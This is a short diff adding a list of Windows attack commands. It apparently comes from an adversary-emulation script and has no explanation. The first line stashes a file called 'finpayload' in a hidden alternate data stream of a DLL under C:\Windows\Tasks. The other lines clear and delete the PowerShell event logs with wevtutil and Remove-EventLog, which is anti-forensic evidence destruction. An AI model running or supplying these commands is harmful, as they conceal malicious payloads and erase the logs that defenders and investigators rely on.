@@ -1,0 +1,9 @@
+type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
+exit
+Get-WinEvent
+Get-EventLog -List
+wevtutil.exe cl "Windows PowerShell" 
+wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
+Remove-EventLog -LogName "Windows PowerShell"
+Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
+Remove-EventLog 
